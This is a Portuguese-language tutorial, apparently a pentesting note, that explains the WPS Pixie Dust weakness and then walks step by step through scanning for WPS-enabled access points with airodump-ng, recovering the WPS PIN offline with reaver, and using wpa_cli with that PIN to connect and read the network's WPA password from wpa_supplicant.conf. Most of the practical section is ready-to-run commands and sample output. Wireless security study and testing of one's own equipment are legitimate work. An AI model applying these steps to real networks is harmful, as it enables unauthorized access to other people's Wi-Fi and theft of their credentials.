## pegando psk com pixie-dust attack 


O pixie dust attack consiste em realizar a quebra do WPS de maneira offline.O método offline 
envolve tentar apenas um PIN aleatório e coletar algumas informações durante o processo. Esses 
dados podem ser usados posteriormente para tentar o ataque pixie-dust.
A vulnerabilidade está na mensagem M3: no corpo da mensagem é utilizado
duas chaves AES de 128 bits randômicas (E-S1 e E-S2) para encriptação da
primeira e da segunda metade do PIN, respectivamente. Se as duas chaves
forem descobertas, é possível recuperar o número PIN com um ataque offline
em menos de um segundo, em vez de “chutar” o número PIN no roteador, processo que pode levar 
de 8 a 12 horas (mais informações sobre o brute-forece offline aqui http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf)


## Parte pratica
##### Com a interface em modo monitor você pode "sniffar" as redes em volta para identificar um alvo em potêncial com o airodump-ng adicionando a flag --wps dessa forma:
```
$ sudo airodump-ng --wps <interface>
```
> Repare na coluna WPS 

```
 CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ]
                                                                                                            
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER  WPS  AUTH  ESSID
                                                                                                             
 00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN          2.0           NETGEAR                         
 00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP     1.0           bigbear 
 00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP    2.0    PSK    teddy                             
                                                                                                            
 BSSID              STATION            PWR   Rate   Lost  Packets  Notes  Probes
                                
 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy 
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy

```

##### Os APs com o WPS ativado apareceram nessa coluna com a versão do wps que o AP possui. Pode acontecer de alguns APs ficarem com um espaço vazio nessa coluna, e isso é porque o wps está desativado.

##### Depois de ter identificado seu alvo, a ferramenta ultilizada para fazer o ataque ao WPS será a Reaver (link no final da pg) com o seguinte comando:
  
```
sudo reaver -i <interface> -c <channel> -b <mac do ap> -K 1
(pode ser adicionado a flag -vv)
```
##### O resultado pode variar um pouco porque depende muito do roteador que está sendo atacado. Essa falha é relativa ao firmware do roteador, não sendo todos os roteadores vulneráveis. Você pode ver alguns exemplos aqui -> https://forums.kali.org/showthread.php?25123-Reaver-modfication-for-Pixie-Dust-Attack ou pesquisar por conta própria e ver vários resultados diferentes que as pessoas conseguem por ai ...
##### Dependendo do resultado do ataque o reaver consegue recuperar apenas o PIN do WPS. Nos meus teste foi esse resultado que consegui, então a idéia é essa, recuperar o PIN com o ataque offline pixie-dust e depois se conectar ao AP com o pin recuperado usando o procedimento abaixo para então pegar o psk:

1. ***Crie o arquivo wpa_supplicant.conf em /etc/ e nesse arquivo vai as seguintes linhas***:

> ctrl_interface=/var/run/wpa_supplicant
>  
> ctrl_interface_group=0
>  
> update_config=1
  

2. ***Inicie o wpa_supplicant, com o arquivo de configuração /etc/wpa_supplicant.conf***:
```  
$ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
```

  
3. ***Em outro terminal inicie o wpa_cli para realizar a conexão ao ponto de acesso por meio do número PIN***:
```  
$ wpa_cli wps_reg 74:EA:3A:E1:E8:66 02283470
                     <mac do ap>    <pin wps>
```
  
  
4. ***O wpa_supplicant fará a conexão ao ponto de acesso. No terminal em que o wpa_supplicant foi iniciado
é retornado uma mensagem de que a conexão foi bem-sucedida***:
```  
$ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
ioctl[SIOCSIWENCODEEXT]: Invalid argument
ioctl[SIOCSIWENCODEEXT]: Invalid argument
wlan0: Failed to initiate AP scan
wlan0: Trying to associate with 74:ea:3a:e1:e8:66 (SSID='TP-LINK_E1E866' freq=2462 MHz)
wlan0: Associated with 74:ea:3a:e1:e8:66
wlan0: WPA: Key negotiation completed with 74:ea:3a:e1:e8:66 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to 74:ea:3a:e1:e8:66
completed (auth) [id=1 id_str=]
```
  
  
5. ***Visualize o conteúdo do arquivo /etc/wpa_supplicant.conf com a senha
wireless da rede***:
```
$ cat /etc/wpa_supplicant.conf
network={
ssid="TP-LINK_E1E866"
bssid=74:ea:3a:e1:e8:66
psk="senha123"
proto=RSN
key_mgmt=WPA-PSK
pairwise=CCMP
auth_alg=OPEN
}
```

referencia:
- https://novatec.com.br/livros/pentest-redes-sem-fio/
- https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access#WPS_PIN_recovery
- https://en.wikipedia.org/wiki/Wi-Fi_Protected_Setup
- https://github.com/wiire-a/pixiewps
- https://github.com/t6x/reaver-wps-fork-t6x
- https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)
